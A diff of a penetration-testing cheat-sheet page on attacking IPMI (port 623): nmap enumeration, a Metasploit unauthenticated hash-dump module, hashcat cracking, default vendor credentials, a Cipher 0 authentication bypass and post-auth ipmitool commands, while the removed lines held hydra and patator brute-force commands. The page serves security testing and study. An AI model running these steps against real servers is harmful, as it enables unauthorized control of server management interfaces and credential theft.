@@ -1,60 +1,59 @@
+# IPMI (623)
+
 !!! tip "Start here"
-    Dump IPMI hashes unauthenticated with MSF: `use auxiliary/scanner/ipmi/ipmi_dumphashes` — this works against IPMI 2.0 without needing credentials. Crack the resulting hashes offline with hashcat mode 7300. Default creds (`admin:admin`, `ADMIN:ADMIN`, `root:calvin`) are also worth trying immediately.
+    Dump IPMI hashes unauthenticated using Metasploit — this works against IPMI 2.0 without credentials. Crack offline with hashcat mode 7300. Default creds are also worth trying immediately: `admin:admin`, `ADMIN:ADMIN`, `root:calvin`.
+
+---
 
 ## Enumeration
-### Checking for Open IMPI Port
+
 ```bash
-nmap -sU -p 623 --script ipmi-version <target-ip>
+nmap -sU -p 623 --script ipmi-version 10.10.10.10
 ```
 
-## Authentication Attacks
-IPMI commonly uses default or weak credentials (`admin:admin`, `ADMIN:ADMIN`, `root:calvin`, etc.). Attempt manual login:
+---
+
+## Hash Dump (Unauthenticated)
+
 ```bash
-ipmitool -I lanplus -H <target-ip> -U admin -P admin chassis status
+msfconsole
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set RHOSTS 10.10.10.10
+run
 ```
 
-Alternatively, we can brute-force credentials using Patator:
 ```bash
-patator ipmi_login host=<target-ip> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:fgrep='Unauthorized name'
+hashcat -m 7300 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-or hydra:
+---
+
+## Default Credentials
+
 ```bash
-hydra -L users.txt -P passwords.txt ipmi://<target-ip> -V
+ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin chassis status
 ```
 
-## Exploiting Vulnerabilities
-### Cipher 0 Auth Bypass
-IPMI 2.0 sometimes allows authentication bypass using Cipher 0. Check if Cipher 0 is enabled using the following:
+---
+
+## Cipher 0 Auth Bypass
+
+IPMI 2.0 sometimes accepts authentication with Cipher 0, which allows any password.
+
 ```bash
-ipmitool -I lanplus -C 0 -H <target-ip> -U ADMIN -P randompassword user list
+ipmitool -I lanplus -C 0 -H 10.10.10.10 -U ADMIN -P anything user list
 ```
 
-If enabled, exploit using the following commands:
+---
+
+## Post-Auth Commands
+
 ```bash
-ipmitool -I lanplus -C 0 -H <target-ip> chassis power status
+ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> user list
+ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> sensor
+ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> sel list
+ipmitool -I lanplus -H 10.10.10.10 -U <user> -P <pass> shell
 ```
 
-#### Retrieving Sensitive information with Cipher 0 Enabled
-##### Enumerate Users
-```bash
-ipmitool -I lanplus -H <target-ip> -U <user> -P <password> user list
-```
-
-##### Access Sensor Data:
-```bash
-ipmitool -I lanplus -H <target-ip> -U <user> -P <password> sensor
-```
-
-##### Access System Event Logs:
-```bash
-ipmitool -I lanplus -H <target-ip> -U <user> -P <password> sel list
-```
-
-##### Executing Remote Commands
-If IMPI grants OS-level access:
-```bash
-ipmitool -I lanplus -H <target-ip> -U <user> -P <password> shell
-```
-
-If successful, execute `whoami` or `id` to confirm.
+!!! tip "Real-world"
+    IPMI is common on bare-metal server hardware (Dell iDRAC, HP iLO, Supermicro BMC). The `root:calvin` default is specific to Dell iDRAC and still works on plenty of unpatched systems. Hash dumps are particularly valuable here — even a cracked IPMI hash often reuses credentials on the host OS or other management interfaces.
